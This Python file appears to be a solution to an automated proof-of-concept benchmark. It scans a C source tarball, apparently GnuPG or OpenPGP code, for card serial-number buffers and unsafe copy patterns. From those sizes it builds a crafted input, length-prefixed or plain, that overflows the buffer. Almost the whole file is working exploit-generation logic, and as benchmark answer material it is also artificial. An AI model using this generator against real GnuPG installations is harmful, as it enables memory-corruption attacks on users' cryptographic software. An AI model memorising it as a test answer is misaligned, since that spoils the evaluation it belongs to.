import os
import re
import tarfile
from typing import Optional, Tuple


class Solution:
    def _analyze(self, src_path: str) -> Tuple[int, bool, bool]:
        sizes = []
        has_lenprefix_pattern = False
        has_plus_one_memcpy = False
        has_nul_assign = False
        has_strcpy_serial = False

        def add_sizes_from_text(text: str):
            for m in re.finditer(r'\bchar\s+([A-Za-z_]\w*serial\w*)\s*\[\s*(\d+)\s*\]', text):
                try:
                    var = m.group(1)
                    sz = int(m.group(2))
                except Exception:
                    continue
                if 8 <= sz <= 512:
                    score = 0
                    vlow = var.lower()
                    if "card" in vlow:
                        score += 3
                    if "serialno" in vlow or "serial" in vlow:
                        score += 2
                    if "s2k" in vlow:
                        score += 1
                    sizes.append((score, sz))

        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                for mem in members:
                    if not mem.isfile():
                        continue
                    name = mem.name.lower()
                    if not (name.endswith(".c") or name.endswith(".h") or name.endswith(".cc") or name.endswith(".cpp")):
                        continue
                    if mem.size <= 0 or mem.size > 2_000_000:
                        continue
                    f = tf.extractfile(mem)
                    if f is None:
                        continue
                    data = f.read()
                    if not data:
                        continue
                    low = data.lower()
                    if b"serial" not in low:
                        continue
                    if b"s2k" not in low and b"gnupg" not in low and b"openpgp" not in low and b"gpg" not in low:
                        continue

                    text = data.decode("latin-1", errors="ignore")

                    add_sizes_from_text(text)

                    if re.search(r'\bstrcpy\s*\([^;]*serial', text, flags=re.IGNORECASE):
                        has_strcpy_serial = True

                    if re.search(r'\bmemcpy\s*\([^;]*serial[^;]*len[^;]*\+\s*1\s*\)', text, flags=re.IGNORECASE):
                        has_plus_one_memcpy = True

                    if re.search(r'\bserial\w*len\w*\s*=\s*\*\s*\w+\s*\+\+', text, flags=re.IGNORECASE):
                        has_lenprefix_pattern = True
                    if re.search(r'\bserial\w*len\w*\s*=\s*\w+\s*\[\s*\w+\s*\+\+\s*\]', text, flags=re.IGNORECASE):
                        has_lenprefix_pattern = True
                    if re.search(r'\bserial\w*len\w*\s*=\s*\w+\s*\[\s*0\s*\]', text, flags=re.IGNORECASE):
                        has_lenprefix_pattern = True

                    if re.search(r'\bserial\w*\s*\[\s*\w*len\w*\s*\]\s*=\s*(?:0|\'\\0\')\s*;', text, flags=re.IGNORECASE):
                        has_nul_assign = True
                    if re.search(r'\bcard\w*serial\w*\s*\[\s*\w*len\w*\s*\]\s*=\s*(?:0|\'\\0\')\s*;', text, flags=re.IGNORECASE):
                        has_nul_assign = True
        except Exception:
            pass

        chosen_size = 25
        if sizes:
            scored = sorted(sizes, key=lambda x: (-x[0], x[1]))
            preferred = [sz for sc, sz in scored if 20 <= sz <= 40]
            if preferred:
                chosen_size = min(preferred)
            else:
                chosen_size = min(sz for _, sz in scored)

        length_prefixed = has_lenprefix_pattern or has_plus_one_memcpy or has_nul_assign
        if not length_prefixed and has_strcpy_serial:
            length_prefixed = False
        elif not length_prefixed and not has_strcpy_serial:
            length_prefixed = True

        overflow_at_equal = has_plus_one_memcpy or has_nul_assign or has_strcpy_serial

        return chosen_size, length_prefixed, overflow_at_equal

    def solve(self, src_path: str) -> bytes:
        buf_size, length_prefixed, overflow_at_equal = self._analyze(src_path)

        if length_prefixed:
            n = buf_size if overflow_at_equal else (buf_size + 1)
            if n < 1:
                n = 25
            if n > 250:
                n = 250
            return bytes([n]) + (b"0" * n) + b"\x00"

        n = buf_size + 1
        if n < 27:
            n = 27
        if n > 4096:
            n = 4096
        return b"0" * n